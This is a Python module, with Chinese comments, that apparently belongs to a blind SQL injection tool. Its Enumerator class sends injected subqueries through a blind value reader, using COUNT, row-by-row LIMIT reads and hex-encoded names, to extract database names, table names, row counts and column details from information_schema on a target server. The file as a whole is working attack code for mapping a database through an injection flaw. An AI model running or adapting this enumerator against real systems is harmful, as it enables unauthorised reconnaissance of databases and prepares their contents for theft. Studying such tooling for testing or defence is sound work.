"""元数据枚举：数据库 → 表 → 列（含字段类型等详细信息）。

逐行读取而不用 GROUP_CONCAT，避免 group_concat_max_len（默认 1024 字节）
截断导致库名/表名/列名缺失；字段信息取自 information_schema.columns。
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .blind import ValueReader
from .utils import debug, info, warn

SEP_HEX = "0x7c"   # '|' 的十六进制字面量，用作字段分隔符

SYSTEM_DATABASES = {"information_schema", "mysql", "performance_schema", "sys"}


@dataclass
class ColumnInfo:
    name: str
    type: str = ""
    nullable: str = ""
    key: str = ""
    default: str = ""
    extra: str = ""
    comment: str = ""


@dataclass
class TableInfo:
    name: str
    engine: str = ""
    rows: str = ""
    columns: list[ColumnInfo] = field(default_factory=list)


@dataclass
class Schema:
    current_database: str = ""
    databases: list[str] = field(default_factory=list)
    tables: dict[str, list[TableInfo]] = field(default_factory=dict)


class Enumerator:
    def __init__(self, reader: ValueReader, dbms: str = "MySQL", max_items: int = 500,
                 deep_system: bool = False) -> None:
        self.reader = reader
        self.dbms = dbms
        self.max_items = max_items
        # 系统库表极多，默认只列表名，不取字段详情
        self.deep_system = deep_system

    # ---------- 精确读取 ----------
    def _count(self, from_where: str) -> int:
        raw = self.reader.read(f"(SELECT COUNT(*) FROM {from_where})")
        digits = "".join(ch for ch in raw if ch.isdigit())
        return int(digits) if digits else 0

    def _read_each(self, expression: str, from_where: str, order_by: str | None = None) -> list[str]:
        """逐行读取单列值：COUNT → LIMIT i,1，保证不丢项。"""
        total = min(self._count(from_where), self.max_items)
        order = f" ORDER BY {order_by}" if order_by else ""
        values: list[str] = []
        for index in range(total):
            raw = self.reader.read(
                f"(SELECT {expression} FROM {from_where}{order} LIMIT {index},1)"
            )
            values.append(raw)
            if total > 20 and (index + 1) % 10 == 0:
                print(f"\r  已读取 {index + 1}/{total}", end="", flush=True)
        if total > 20:
            print()
        return values

    # ---------- 数据库 ----------
    def databases(self) -> list[str]:
        """information_schema.schemata 中的全部库名（含系统库）。"""
        names = [n.strip() for n in self._read_each("schema_name", "information_schema.schemata", "schema_name")]
        names = [n for n in names if n]
        info(f"数据库共 {len(names)} 个：{', '.join(names) if names else '无'}")
        return names

    def current_database(self) -> str:
        """当前连接默认库。

        DATABASE() 返回 NULL 时依次退回 SCHEMA() 与 processlist，
        避免把空串误当成“无库”而猜错目标库。
        """
        candidates = [
            "DATABASE()",
            "SCHEMA()",
            "(SELECT db FROM information_schema.processlist WHERE id=CONNECTION_ID())",
        ]
        for expression in candidates:
            raw = self.reader.read(f"(SELECT IFNULL({expression},0x20))").strip()
            if raw:
                debug(f"当前库判定：{expression} → {raw}")
                return raw
        return ""

    # ---------- 表 ----------
    def table_names(self, database: str) -> list[str]:
        where = f"information_schema.tables WHERE table_schema=0x{database.encode().hex()}"
        names = [n.strip() for n in self._read_each("table_name", where, "table_name")]
        return [n for n in names if n]

    def table_infos(self, database: str) -> list[TableInfo]:
        where = f"information_schema.tables WHERE table_schema=0x{database.encode().hex()}"
        expression = (
            f"CONCAT_WS({SEP_HEX},table_name,IFNULL(engine,0x20),"
            f"IFNULL(table_rows,0x20),IFNULL(table_type,0x20))"
        )
        raw_rows = self._read_each(expression, where, "table_name")
        is_system = database.lower() in SYSTEM_DATABASES
        fetch_columns = not is_system or self.deep_system
        tables: list[TableInfo] = []
        for raw in raw_rows:
            parts = (raw.split("|") + ["", "", "", ""])[:4]
            name = parts[0].strip()
            if not name:
                continue
            table = TableInfo(
                name=name,
                engine=parts[1].strip(),
                rows=self._exact_rows(database, name) or parts[2].strip(),
            )
            if fetch_columns:
                table.columns = self.column_infos(database, name)
            tables.append(table)
        if tables:
            info(f"{database} 共 {len(tables)} 张表：{', '.join(t.name for t in tables)}")
            if is_system and not self.deep_system:
                debug("系统库默认不展开字段详情（可用 --deep-system 强制展开）")
        else:
            warn(f"{database} 未发现表（可能无权限）")
        return tables

    def _exact_rows(self, database: str, table: str) -> str:
        """对可读表取精确 COUNT(*)，否则回退 information_schema 估算值。"""
        try:
            total = self._count(f"`{database}`.`{table}`")
        except Exception:
            return ""
        return str(total) if total > 0 else ""

    # ---------- 列 ----------
    def column_infos(self, database: str, table: str) -> list[ColumnInfo]:
        where = (
            "information_schema.columns "
            f"WHERE table_schema=0x{database.encode().hex()} "
            f"AND table_name=0x{table.encode().hex()}"
        )
        expression = (
            f"CONCAT_WS({SEP_HEX},column_name,column_type,IFNULL(is_nullable,0x20),"
            f"IFNULL(column_key,0x20),IFNULL(column_default,0x20),"
            f"IFNULL(extra,0x20),IFNULL(column_comment,0x20))"
        )
        columns: list[ColumnInfo] = []
        for raw in self._read_each(expression, where, "ordinal_position"):
            parts = (raw.split("|") + [""] * 7)[:7]
            name = parts[0].strip()
            if not name:
                continue
            columns.append(
                ColumnInfo(
                    name=name,
                    type=parts[1].strip(),
                    nullable=parts[2].strip(),
                    key=parts[3].strip(),
                    default=parts[4].strip(),
                    extra=parts[5].strip(),
                    comment=parts[6].strip(),
                )
            )
        return columns

    def columns(self, database: str, table: str) -> list[str]:
        """只要列名（供导出使用）。"""
        return [c.name for c in self.column_infos(database, table)]

    # ---------- 汇总 ----------
    def schema(
        self,
        database: str | None = None,
        all_databases: bool = False,
        include_system: bool = False,
    ) -> Schema:
        result = Schema()
        result.current_database = self.current_database()
        every_db = self.databases()
        result.databases = (
            every_db if include_system
            else [db for db in every_db if db.lower() not in SYSTEM_DATABASES]
        )
        hidden = len(every_db) - len(result.databases)
        if hidden:
            debug(f"已隐藏 {hidden} 个系统库（--include-system 可显示）")
        if result.current_database:
            info(f"当前数据库：{result.current_database}")
        else:
            info("当前数据库：无（连接未选中默认库）")

        if database:
            targets = [database]
        elif all_databases:
            targets = list(result.databases)
        else:
            # 默认只枚举当前库；当前库未知或为系统库时取第一个用户库
            target = result.current_database
            if not target or target.lower() in SYSTEM_DATABASES:
                target = next(
                    (db for db in result.databases if db.lower() not in SYSTEM_DATABASES),
                    "",
                )
            targets = [target] if target else []

        if not targets:
            warn("无法确定要枚举的数据库，请用 --db 指定")
            return result

        for db in targets:
            info(f"枚举数据库：{db}{'（当前库）' if db == result.current_database else ''}")
            result.tables[db] = self.table_infos(db)
        return result
